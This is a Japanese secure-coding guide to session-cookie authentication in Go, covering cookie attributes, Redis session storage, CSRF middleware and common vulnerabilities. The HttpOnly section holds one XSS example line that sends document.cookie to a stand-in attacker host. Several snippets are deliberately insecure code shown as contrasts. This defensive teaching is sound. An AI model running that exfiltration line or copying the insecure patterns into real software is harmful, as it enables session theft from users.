# セッションCookie認証

## 目次

- [セッションCookie認証とは](#セッションcookie認証とは)
- [JWT認証との違い](#jwt認証との違い)
- [セッションCookieのセキュリティ](#セッションcookieのセキュリティ)
- [Cookie属性の詳細](#cookie属性の詳細)
- [実装パターン](#実装パターン)
- [セッション管理のベストプラクティス](#セッション管理のベストプラクティス)
- [よくある脆弱性と対策](#よくある脆弱性と対策)

---

## セッションCookie認証とは

セッションCookie認証は、サーバー側でユーザーの認証状態（セッション）を管理し、クライアントにはセッションIDのみをCookieで保存する認証方式です。

### 基本的な仕組み

```
1. ユーザーがログイン
   ↓
2. サーバーがセッションIDを生成
   ↓
3. セッションデータをサーバー側に保存（Redis/DB）
   ↓
4. セッションIDをCookieでクライアントに送信
   ↓
5. クライアントは以降のリクエストで自動的にCookieを送信
   ↓
6. サーバーはセッションIDからセッションデータを取得
```

### セッションデータの例

```json
{
  "session_id": "abc123...",
  "username": "user1",
  "role": "user",
  "email": "user1@example.com",
  "created_at": 1730458800,
  "expires_at": 1730462400
}
```

---

## JWT認証との違い

| 観点 | セッションCookie | JWT |
|------|----------------|-----|
| **データ保存場所** | サーバー側（Redis/DB） | クライアント側（Cookie/localStorage） |
| **トークンサイズ** | 小さい（セッションIDのみ） | 大きい（全データ含む） |
| **サーバー負荷** | 高い（毎回DB/Redis検索） | 低い（署名検証のみ） |
| **即座の無効化** | 可能（サーバーで削除） | 困難（有効期限まで有効） |
| **スケーラビリティ** | 低い（セッション共有必要） | 高い（ステートレス） |
| **セキュリティ** | データはサーバーのみ | データはクライアント側にも存在 |
| **CSRF対策** | 必須 | 不要（Authorization Header使用時） |

### それぞれの適用場面

**セッションCookie が適している場合:**
- モノリシックなWebアプリケーション
- 即座のセッション無効化が必要
- サーバー数が少ない
- 従来型のWebアプリケーション

**JWT が適している場合:**
- マイクロサービスアーキテクチャ
- SPA（Single Page Application）
- モバイルアプリ
- 水平スケールが必要

---

## セッションCookieのセキュリティ

### 1. HttpOnly属性（必須）

JavaScriptからCookieへのアクセスを防ぎ、XSS攻撃による窃取を防止します。

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session_id",
    Value:    sessionID,
    HttpOnly: true, // JavaScriptから読み取り不可
})
```

**攻撃シナリオ（HttpOnly=falseの場合）:**
```javascript
// XSS攻撃でCookieを盗む
fetch('https://attacker.com/steal?cookie=' + document.cookie);
```

**HttpOnly=trueの場合:**
```javascript
console.log(document.cookie); // session_idは表示されない
```

---

### 2. Secure属性（本番環境必須）

HTTPS通信でのみCookieを送信し、中間者攻撃（MITM）を防止します。

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session_id",
    Value:    sessionID,
    HttpOnly: true,
    Secure:   true, // HTTPSのみ
})
```

**攻撃シナリオ（Secure=falseの場合）:**
```
1. ユーザーがHTTPでアクセス
2. 攻撃者がネットワークを盗聴
3. セッションIDを取得
4. セッションハイジャック成功
```

---

### 3. SameSite属性（CSRF対策）

クロスサイトリクエスト時のCookie送信を制御し、CSRF攻撃を防止します。

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session_id",
    Value:    sessionID,
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteLaxMode, // 推奨
})
```

**SameSite属性の値:**

| 値 | 説明 | CSRF防御 | 使用場面 |
|----|------|---------|---------|
| **Strict** | 完全に同一サイトのみ | 最強 | 高セキュリティが必要 |
| **Lax** | トップレベルナビゲーションのGETのみ | 強い | 一般的なWebサイト（推奨） |
| **None** | すべて送信（Secure必須） | なし | iframe埋め込み |

詳細は [docs/04-csrf.md](./04-csrf.md) を参照

---

### 4. Path属性

Cookieが送信されるパスを制限します。

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session_id",
    Value:    sessionID,
    Path:     "/",        // サイト全体
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteLaxMode,
})
```

**セキュリティ上の注意:**
- `Path=/` が最も一般的
- サブディレクトリのみに制限する場合: `Path=/admin`

---

### 5. Domain属性

Cookieが送信されるドメインを制限します。

```go
http.SetCookie(w, &http.Cookie{
    Name:   "session_id",
    Value:  sessionID,
    Domain: "", // 未指定＝現在のホストのみ（推奨）
})
```

**セキュリティ上の注意:**
- 通常は指定しない（現在のホストのみ）
- サブドメインで共有する場合: `Domain=.example.com`

---

### 6. MaxAge / Expires

Cookieの有効期限を設定します。

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session_id",
    Value:    sessionID,
    MaxAge:   3600,  // 1時間（秒単位）
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteLaxMode,
})
```

**セキュリティ上の推奨:**
- セッションCookie: 1〜2時間
- Remember Me: 7〜30日（別途実装）
- MaxAge=0 または -1: Cookie削除

---

## Cookie属性の詳細

### セキュアなCookie設定の例

```go
func setSecureCookie(w http.ResponseWriter, name, value string, maxAge int) {
    http.SetCookie(w, &http.Cookie{
        Name:     name,
        Value:    value,
        Path:     "/",
        MaxAge:   maxAge,
        HttpOnly: true,                 // XSS対策
        Secure:   true,                  // HTTPS必須
        SameSite: http.SameSiteLaxMode, // CSRF対策
    })
}
```

### Cookie属性の組み合わせ

| 用途 | HttpOnly | Secure | SameSite | MaxAge |
|------|----------|--------|----------|--------|
| **セッションCookie** | true | true | Lax | 3600 (1時間) |
| **Remember Me** | true | true | Lax | 2592000 (30日) |
| **CSRF Token（Cookie方式）** | false | true | Lax | 3600 |
| **Analytics（非機密）** | false | false | None | 31536000 (1年) |

---

## 実装パターン

### セキュアな実装（Redis使用）

#### 1. ログイン処理

```go
func loginHandler(w http.ResponseWriter, r *http.Request) {
    var req struct {
        Username string `json:"username"`
        Password string `json:"password"`
    }
    json.NewDecoder(r.Body).Decode(&req)

    // ユーザー認証
    user := authenticateUser(req.Username, req.Password)
    if user == nil {
        sendJSONError(w, "Invalid credentials", http.StatusUnauthorized)
        return
    }

    // セッションID生成（暗号学的に安全）
    sessionID, _ := generateSessionID()

    // セッションデータ作成
    session := SessionData{
        Username:  user.Username,
        Role:      user.Role,
        CreatedAt: time.Now(),
        ExpiresAt: time.Now().Add(1 * time.Hour),
    }

    // Redisに保存（1時間TTL）
    saveSession(sessionID, session)

    // CSRFトークン生成
    csrfToken, _ := generateCSRFToken()
    saveCSRFToken(sessionID, csrfToken)

    // セキュアなCookie設定
    setSecureCookie(w, "session_id", sessionID, 3600)

    // レスポンス
    json.NewEncoder(w).Encode(map[string]interface{}{
        "message":    "Login successful",
        "username":   user.Username,
        "csrf_token": csrfToken,
    })
}
```

#### 2. セッションID生成

```go
func generateSessionID() (string, error) {
    // 256ビットのランダムバイト
    b := make([]byte, 32)
    if _, err := rand.Read(b); err != nil {
        return "", err
    }
    return base64.URLEncoding.EncodeToString(b), nil
}
```

**重要なポイント:**
- `crypto/rand` を使用（`math/rand` は予測可能なため使用禁止）
- 最低でも128ビット（16バイト）以上
- Base64エンコードでURL安全な文字列に変換

#### 3. セッション検証ミドルウェア

```go
func sessionMiddleware(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        // Cookieからセッションid取得
        cookie, err := r.Cookie("session_id")
        if err != nil {
            sendJSONError(w, "Authentication required", http.StatusUnauthorized)
            return
        }

        // Redisからセッション取得
        session, err := getSession(cookie.Value)
        if err != nil || session == nil {
            sendJSONError(w, "Invalid session", http.StatusUnauthorized)
            return
        }

        // 有効期限チェック
        if time.Now().After(session.ExpiresAt) {
            deleteSession(cookie.Value)
            sendJSONError(w, "Session expired", http.StatusUnauthorized)
            return
        }

        // コンテキストにセッション情報を追加
        ctx := context.WithValue(r.Context(), "session", session)
        next(w, r.WithContext(ctx))
    }
}
```

#### 4. CSRF検証ミドルウェア

```go
func csrfMiddleware(next http.HandlerFunc) http.HandlerFunc {
    return sessionMiddleware(func(w http.ResponseWriter, r *http.Request) {
        // GETリクエストはCSRF検証不要
        if r.Method == http.MethodGet {
            next(w, r)
            return
        }

        sessionID := r.Context().Value("session_id").(string)
        csrfToken := r.Header.Get("X-CSRF-Token")

        if csrfToken == "" {
            sendJSONError(w, "CSRF token required", http.StatusForbidden)
            return
        }

        valid, _ := validateCSRFToken(sessionID, csrfToken)
        if !valid {
            sendJSONError(w, "Invalid CSRF token", http.StatusForbidden)
            return
        }

        next(w, r)
    })
}
```

#### 5. Redisセッション管理

```go
// セッション保存
func saveSession(sessionID string, session SessionData) error {
    sessionJSON, _ := json.Marshal(session)
    key := "session:" + sessionID
    ttl := 1 * time.Hour
    return redisClient.Set(ctx, key, sessionJSON, ttl).Err()
}

// セッション取得
func getSession(sessionID string) (*SessionData, error) {
    key := "session:" + sessionID
    sessionJSON, err := redisClient.Get(ctx, key).Result()
    if err == redis.Nil {
        return nil, nil // セッションが存在しない
    }
    if err != nil {
        return nil, err
    }

    var session SessionData
    json.Unmarshal([]byte(sessionJSON), &session)
    return &session, nil
}

// セッション削除
func deleteSession(sessionID string) error {
    key := "session:" + sessionID
    return redisClient.Del(ctx, key).Err()
}
```

---

## セッション管理のベストプラクティス

### 1. セッションID生成

**推奨される実装:**
```go
import "crypto/rand"

func generateSessionID() (string, error) {
    b := make([]byte, 32) // 256ビット
    if _, err := rand.Read(b); err != nil {
        return "", err
    }
    return base64.URLEncoding.EncodeToString(b), nil
}
```

**避けるべき実装:**
```go
// 悪い例: 予測可能
sessionID := fmt.Sprintf("%d", time.Now().UnixNano())

// 悪い例: math/rand（予測可能）
sessionID := strconv.Itoa(rand.Intn(1000000))
```

---

### 2. セッションの有効期限

| セッションタイプ | 推奨期限 | 理由 |
|----------------|---------|------|
| **通常セッション** | 1〜2時間 | バランスが良い |
| **高セキュリティ** | 15〜30分 | 銀行、決済サイト |
| **Remember Me** | 7〜30日 | 利便性重視（別Cookie） |
| **API セッション** | 24時間 | 再ログイン頻度を下げる |

**有効期限の更新（スライディングセッション）:**
```go
// アクティビティがあるたびに有効期限を延長
func refreshSession(sessionID string) error {
    key := "session:" + sessionID
    ttl := 1 * time.Hour
    return redisClient.Expire(ctx, key, ttl).Err()
}
```

---

### 3. セッション固定攻撃対策

セッション固定攻撃は、攻撃者が事前に用意したセッションIDを被害者に使わせる攻撃です。

**対策: ログイン成功時にセッションIDを再生成**

```go
func loginHandler(w http.ResponseWriter, r *http.Request) {
    // 既存のセッションがある場合は削除
    if cookie, err := r.Cookie("session_id"); err == nil {
        deleteSession(cookie.Value)
    }

    // 認証成功後、新しいセッションIDを生成
    newSessionID, _ := generateSessionID()

    // 新しいセッションを作成
    saveSession(newSessionID, session)
    setSecureCookie(w, "session_id", newSessionID, 3600)
}
```

---

### 4. 同時ログイン制限

```go
// ユーザーごとのセッションリストを管理
func saveSession(username, sessionID string, session SessionData) error {
    // セッションデータ保存
    sessionKey := "session:" + sessionID
    sessionJSON, _ := json.Marshal(session)
    redisClient.Set(ctx, sessionKey, sessionJSON, 1*time.Hour)

    // ユーザーのセッションリストに追加
    userSessionsKey := "user_sessions:" + username
    redisClient.SAdd(ctx, userSessionsKey, sessionID)
    redisClient.Expire(ctx, userSessionsKey, 1*time.Hour)

    return nil
}

// 最大セッション数チェック
func checkMaxSessions(username string, maxSessions int) error {
    userSessionsKey := "user_sessions:" + username
    count, _ := redisClient.SCard(ctx, userSessionsKey).Result()

    if count >= int64(maxSessions) {
        // 古いセッションを削除
        oldestSession, _ := redisClient.SPop(ctx, userSessionsKey).Result()
        deleteSession(oldestSession)
    }

    return nil
}
```

---

### 5. セッション監査ログ

```go
type SessionLog struct {
    SessionID string    `json:"session_id"`
    Username  string    `json:"username"`
    IPAddress string    `json:"ip_address"`
    UserAgent string    `json:"user_agent"`
    Action    string    `json:"action"` // login, logout, expired
    Timestamp time.Time `json:"timestamp"`
}

func logSessionActivity(session SessionLog) {
    logJSON, _ := json.Marshal(session)
    log.Printf("SESSION: %s", logJSON)

    // Redisに保存（監査用）
    key := fmt.Sprintf("session_log:%s:%d", session.Username, time.Now().Unix())
    redisClient.Set(ctx, key, logJSON, 30*24*time.Hour) // 30日保持
}
```

---

## よくある脆弱性と対策

### 1. セッションハイジャック

**脆弱性:**
```go
// 悪い例: HttpOnlyなし、Secureなし
http.SetCookie(w, &http.Cookie{
    Name:  "session_id",
    Value: sessionID,
})
```

**対策:**
```go
// 良い例
http.SetCookie(w, &http.Cookie{
    Name:     "session_id",
    Value:    sessionID,
    HttpOnly: true, // XSS対策
    Secure:   true, // HTTPS必須
    SameSite: http.SameSiteLaxMode, // CSRF対策
})
```

---

### 2. セッション固定攻撃

**脆弱性:**
```go
// 悪い例: ログイン後もセッションIDを変更しない
func loginHandler(w http.ResponseWriter, r *http.Request) {
    // 既存のセッションIDをそのまま使用（危険）
    cookie, _ := r.Cookie("session_id")
    updateSession(cookie.Value, user)
}
```

**対策:**
```go
// 良い例: ログイン成功時にセッションIDを再生成
func loginHandler(w http.ResponseWriter, r *http.Request) {
    // 古いセッションを削除
    if cookie, err := r.Cookie("session_id"); err == nil {
        deleteSession(cookie.Value)
    }

    // 新しいセッションIDを生成
    newSessionID, _ := generateSessionID()
    saveSession(newSessionID, user)
    setSecureCookie(w, "session_id", newSessionID, 3600)
}
```

---

### 3. 予測可能なセッションID

**脆弱性:**
```go
// 悪い例: 予測可能なセッションID
sessionID := fmt.Sprintf("%s_%d", username, time.Now().Unix())
```

**対策:**
```go
// 良い例: 暗号学的に安全な乱数
func generateSessionID() (string, error) {
    b := make([]byte, 32) // 256ビット
    if _, err := rand.Read(b); err != nil {
        return "", err
    }
    return base64.URLEncoding.EncodeToString(b), nil
}
```

---

### 4. セッションの有効期限なし

**脆弱性:**
```go
// 悪い例: TTLなし（永久に有効）
redisClient.Set(ctx, "session:"+sessionID, sessionJSON, 0)
```

**対策:**
```go
// 良い例: 適切なTTL設定
ttl := 1 * time.Hour
redisClient.Set(ctx, "session:"+sessionID, sessionJSON, ttl)
```

---

### 5. CSRF対策なし

**脆弱性:**
```go
// 悪い例: CSRFトークン検証なし
func transferHandler(w http.ResponseWriter, r *http.Request) {
    // セッション認証のみ（CSRF脆弱）
    session := getSessionFromCookie(r)
    executeTransfer(session, request)
}
```

**対策:**
```go
// 良い例: CSRF検証ミドルウェア
func transferHandler(w http.ResponseWriter, r *http.Request) {
    // 1. セッション認証
    session := getSessionFromCookie(r)

    // 2. CSRFトークン検証
    csrfToken := r.Header.Get("X-CSRF-Token")
    if !validateCSRFToken(session.ID, csrfToken) {
        http.Error(w, "Invalid CSRF token", http.StatusForbidden)
        return
    }

    // 3. 処理実行
    executeTransfer(session, request)
}
```

---

## セキュリティチェックリスト

- [ ] HttpOnly属性を設定（XSS対策）
- [ ] Secure属性を設定（HTTPS必須）
- [ ] SameSite=Lax以上を設定（CSRF対策）
- [ ] 暗号学的に安全なセッションID生成（crypto/rand）
- [ ] セッションに適切な有効期限を設定（1〜2時間）
- [ ] ログイン成功時にセッションIDを再生成（セッション固定攻撃対策）
- [ ] CSRFトークンによる保護（POST/PUT/DELETE）
- [ ] セッションデータはサーバー側のみに保存
- [ ] ログアウト時にセッションを削除
- [ ] Redisなど外部ストレージでセッション管理（スケール対応）

---

## まとめ

### セッションCookie認証の利点

1. **セキュリティ**
   - データはサーバー側のみに保存
   - 即座にセッション無効化可能
   - クライアント側のデータ改ざん不可

2. **シンプル**
   - ブラウザが自動的にCookieを送信
   - クライアント側の実装が簡単

3. **即座の制御**
   - サーバー側でセッションを削除すれば即座に無効化
   - 権限変更が即座に反映

### セッションCookie認証の欠点

1. **スケーラビリティ**
   - サーバー間でセッション共有が必要
   - Redis/DBへの負荷

2. **パフォーマンス**
   - 毎回Redis/DBへの問い合わせが必要

3. **CSRF対策必須**
   - Cookieは自動送信されるため、CSRF攻撃に脆弱
   - CSRFトークンによる追加の保護が必要

### 推奨される実装

**最もセキュアな構成:**
```go
http.SetCookie(w, &http.Cookie{
    Name:     "session_id",
    Value:    sessionID,
    Path:     "/",
    MaxAge:   3600,                    // 1時間
    HttpOnly: true,                     // XSS対策
    Secure:   true,                     // HTTPS必須
    SameSite: http.SameSiteLaxMode,    // CSRF対策
})
```

**Redis管理:**
```go
// セッション保存（1時間TTL）
ttl := 1 * time.Hour
redisClient.Set(ctx, "session:"+sessionID, sessionJSON, ttl)
```

**CSRF保護:**
```go
// POST/PUT/DELETEリクエストでCSRFトークン検証
csrfToken := r.Header.Get("X-CSRF-Token")
validateCSRFToken(sessionID, csrfToken)
```

---

## 参考資料

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN - Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [MDN - SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
- [CWE-613: Insufficient Session Expiration](https://cwe.mitre.org/data/definitions/613.html)
